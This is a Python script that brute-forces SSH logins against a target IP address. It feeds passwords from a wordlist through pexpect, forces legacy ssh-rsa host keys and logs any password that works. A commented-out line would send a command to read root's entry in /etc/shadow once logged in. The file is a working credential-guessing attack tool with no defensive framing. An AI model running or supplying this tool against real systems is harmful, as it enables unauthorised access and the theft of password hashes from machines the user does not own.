import pexpect
import optparse
from misc import *

# add options 
parser = optparse.OptionParser()
parser.add_option('-i', dest='host', help="enter the target device's IP address")
parser.add_option('-u', dest='username', help="enter the username of the target device")
parser.add_option('-p', dest='password', help="enter the password of the target device")
parser.add_option('-b', dest='is_brute_force', help="enter true if you want to brute force the SSH connection")
parser.add_option('-f', dest="file_location", help="enter password file location")
(options, arg) = parser.parse_args()

prompt = ['#', '>>>', '>', '\$ ']

def connect(host, username, password):
    ssh_newkey = "Are you sure you want to continue connecting"
    ssh_connect_cmd = "ssh -v -oHostKeyAlgorithms=+ssh-rsa " + username + "@" + host
    child = pexpect.spawn(ssh_connect_cmd)
    ret = child.expect([pexpect.TIMEOUT, ssh_newkey, "[P|p]assword"])
    if ret == 0:
        log_error(f"Failed to connect to {host}")
        return
    elif ret == 1:
        child.sendline("yes")
        ret = child.expect([pexpect.TIMEOUT, "[P|p]assword"])
        if ret == 0:
            log_error(f"Failed to connect to {host}")
            return
    
    child.sendline(password)
    child.expect(prompt, timeout=0.1)
    return child


# def send_command(child, command):
#     child.sendline(command)
#     child.expect(prompt)
#     print(child.before)

is_brute_force = options.is_brute_force
file_location = options.file_location
file = open(file_location, 'r')
host = options.host
username = options.username
password = options.password
for pw in file.readlines():
    try:
        pw = pw.strip('\n')
        child = connect(host, username, pw)
        # send_command(child, 'more /etc/shadow | grep root:ps')
        log_info(f"Password found: {pw}")
    except:
        log_error(f"Wrong password: {pw}")


